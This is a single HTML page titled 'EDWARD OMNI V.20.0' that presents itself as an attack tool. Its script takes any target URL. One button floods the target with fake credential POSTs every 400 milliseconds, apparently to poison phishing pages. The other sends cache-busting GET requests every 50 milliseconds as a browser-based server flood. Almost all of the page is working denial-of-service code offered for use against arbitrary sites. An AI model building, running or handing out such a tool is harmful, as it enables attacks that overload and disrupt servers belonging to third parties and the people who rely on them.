<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>[ EDWARD OMNI V.20.0 ]</title>
    <style>
        :root { --neon: #0f0; --purple: #bc13fe; --danger: #f00; --bg: #050505; }
        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; text-align: center; padding: 15px; margin:0; }
        .panel { background: #111; border: 2px solid #333; padding: 15px; border-radius: 15px; margin-bottom: 15px; }
        input { background: #000; border: 1px solid var(--purple); color: #fff; padding: 12px; width: 85%; border-radius: 8px; margin-bottom: 10px; text-align: center; outline: none; }
        button { background: var(--purple); color: #fff; border: none; padding: 12px; width: 90%; font-weight: bold; cursor: pointer; border-radius: 8px; text-transform: uppercase; margin: 5px 0; }
        .log-box { font-size: 9px; color: #0f0; background: #000; padding: 10px; border-radius: 5px; height: 150px; overflow-y: hidden; text-align: left; border: 1px solid #222; }
        #statusTeks { color: var(--danger); font-size: 11px; font-weight: bold; height: 15px; margin-bottom: 5px; }
    </style>
</head>
<body>

    <h1 style="color:var(--purple); text-shadow: 0 0 10px var(--purple);">EDWARD V.20.0</h1>
    <p style="font-size:9px; margin-top:-10px;">[ NO ALERT - GHOST SYSTEM ]</p>

    <div class="panel" style="border-color: var(--purple)">
        <div id="statusTeks"></div>
        <input type="text" id="targetUrl" placeholder="URL Target (Phishing/Server)">
        <div style="display: flex; gap: 5px; justify-content: center;">
            <button onclick="startPoison()" style="background:var(--purple); font-size: 10px;">POISON DATA</button>
            <button onclick="startFlood()" style="background:var(--danger); font-size: 10px;">FLOOD SERVER</button>
        </div>
        
        <div class="log-box" id="logBox">
            > System Ready... No more alerts.<br>
        </div>
    </div>

    <button onclick="location.reload()" style="background:#222; width:50%; font-size:10px;">RESET SYSTEM</button>

    <script>
        const log = document.getElementById('logBox');
        const st = document.getElementById('statusTeks');
        
        function addLog(msg) {
            log.innerHTML += "> " + msg + "<br>";
            log.scrollTop = log.scrollHeight;
        }

        function showStatus(txt) {
            st.innerHTML = txt;
            setTimeout(() => { st.innerHTML = ""; }, 3000);
        }

        function startPoison() {
            let url = document.getElementById('targetUrl').value;
            if(!url) return showStatus("MASUKKAN URL TARGET!");
            if(!url.startsWith('http')) url = 'https://' + url;

            addLog("Poisoning: " + url);
            setInterval(() => {
                const u = "user_" + Math.random().toString(36).substring(7);
                const p = "pass_" + Math.random().toString(36).substring(5);
                fetch(url, { method: 'POST', mode: 'no-cors', body: new URLSearchParams({'u':u,'p':p}) });
                addLog("Injecting: " + u);
            }, 400);
        }

        function startFlood() {
            let url = document.getElementById('targetUrl').value;
            if(!url) return showStatus("MASUKKAN URL TARGET!");
            if(!url.startsWith('http')) url = 'https://' + url;

            addLog("Flooding: " + url);
            setInterval(() => {
                fetch(url + "/?ghost=" + Math.random(), { mode: 'no-cors' });
                addLog("Packet Sent...");
            }, 50);
        }
    </script>
</body>
</html>
